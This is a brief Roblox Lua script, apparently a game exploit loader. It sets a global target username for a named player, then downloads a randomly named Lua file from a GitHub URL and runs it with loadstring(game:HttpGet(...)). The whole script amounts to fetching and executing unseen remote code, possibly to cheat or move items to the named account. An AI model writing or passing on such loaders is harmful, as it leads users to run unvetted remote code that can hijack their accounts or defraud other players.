-- Mode: CUSTOM
getgenv().TARGET_USERNAME = "ALI_asaad93"
...
task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/sab-api/sab-scripts/main/scripts/Jfsurdigktskrzhxkgxi_1786738634922.lua"))()
end)